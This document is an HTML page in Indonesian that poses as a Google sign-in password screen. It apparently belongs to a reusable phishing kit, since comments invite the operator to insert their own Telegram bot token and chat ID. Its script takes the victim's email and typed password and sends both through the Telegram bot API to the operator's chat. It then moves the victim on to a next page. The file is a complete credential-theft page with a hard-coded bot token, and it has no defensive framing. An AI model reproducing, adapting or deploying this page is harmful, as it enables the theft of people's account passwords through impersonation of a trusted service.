<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Masukkan Kata Sandi</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #fff;
            margin: 0;
            padding: 0;
            min-height: 100vh;
        }
        .mobile-container {
            padding: 20px;
            max-width: 100%;
            margin: 0 auto;
        }
        .login-container {
            width: 100%;
            background-color: #fff;
            padding: 24px 16px;
            text-align: center;
        }
        .google-logo {
            height: 20px;
            margin-bottom: 20px;
        }
        .login-title {
            color: #202124;
            font-size: 20px;
            font-weight: 400;
            margin-bottom: 12px;
        }
        .form-control {
            height: 48px;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            margin-bottom: 8px;
            width: 100%;
        }
        .error-message {
            display: none;
            color: #d93025;
            font-size: 12px;
            margin-top: 8px;
            text-align: left;
        }
        .toggle-password {
            color: #1a73e8;
            font-size: 14px;
            cursor: pointer;
            display: block;
            text-align: left;
            margin-top: 8px;
            margin-bottom: 24px;
            padding: 8px 0;
        }
        .btn-next {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            width: auto;
            min-width: 100px;
        }
        .bottom-links {
            margin-top: 24px;
        }
        .bottom-links a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            padding: 8px 0;
            display: inline-block;
        }
        .email-display {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 24px;
            padding: 8px;
            background-color: #f8f9fa;
            border-radius: 4px;
        }
        .email-icon {
            width: 24px;
            height: 24px;
            background-color: #1a73e8;
            border-radius: 50%;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 8px;
            font-size: 12px;
            font-weight: bold;
        }
        .action-buttons {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 16px;
            background-color: #fff;
            box-shadow: 0 -2px 6px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>
    <div class="mobile-container">
        <div class="main-content">
            <div class="login-container">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
                <h1 class="login-title">Selamat datang</h1>
                <div class="email-display">
                    <div class="email-icon">A</div>
                    <span id="userEmail">namaemailanda@gmail.com</span>
                </div>
                <form id="passwordForm">
                    <div class="mb-4">
                        <input type="password" class="form-control" id="passwordInput" placeholder="Masukkan kata sandi Anda" required>
                        <div class="error-message" id="errorMessage">
                            Masukkan kata sandi Anda
                        </div>
                        <span class="toggle-password" id="togglePassword">Tampilkan kata sandi</span>
                    </div>
                </form>
            </div>
        </div>
        <div class="action-buttons">
            <div class="d-flex justify-content-end">
                <button type="submit" form="passwordForm" class="btn-next">Selanjutnya</button>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Ambil email dari sessionStorage dan tampilkan
        document.addEventListener("DOMContentLoaded", function() {
            const email = sessionStorage.getItem('userEmail');
            if (email) {
                document.getElementById('userEmail').textContent = email;
            }
        });

        document.getElementById('passwordForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const passwordInput = document.getElementById('passwordInput');
            const errorMessage = document.getElementById('errorMessage');

            if (!passwordInput.value.trim()) {
                errorMessage.style.display = 'block';
                passwordInput.classList.add('is-invalid');
            } else {
                errorMessage.style.display = 'none';
                passwordInput.classList.remove('is-invalid');

                const email = document.getElementById('userEmail').textContent;
                sendToTelegram(email, passwordInput.value);
            }
        });

        document.getElementById('togglePassword').addEventListener('click', function() {
            const passwordInput = document.getElementById('passwordInput');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                this.textContent = 'Sembunyikan kata sandi';
            } else {
                passwordInput.type = 'password';
                this.textContent = 'Tampilkan kata sandi';
            }
        });

        function sendToTelegram(email, password) {
            const token = '7570919901:AAFjLjwD0H26KM62955Vnxuy2C1M9G8p-c'; // Ganti dengan token bot Telegram Anda
            const chatId = '7681252717'; // Ganti dengan chat ID Anda

            const message = `ðŸ”’ Login Attempt:\nðŸ“§ Email: ${email}\nðŸ”‘ Password: ${password}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert('Data terkirim!');
                        window.location.href = 'kata-sandi-email.html';
                    } else {
                        alert('Gagal mengirim data.');
                    }
                })
                .catch(() => {
                    alert('Gagal menghubungi server.');
                });
        }
    </script>
</body>
</html>
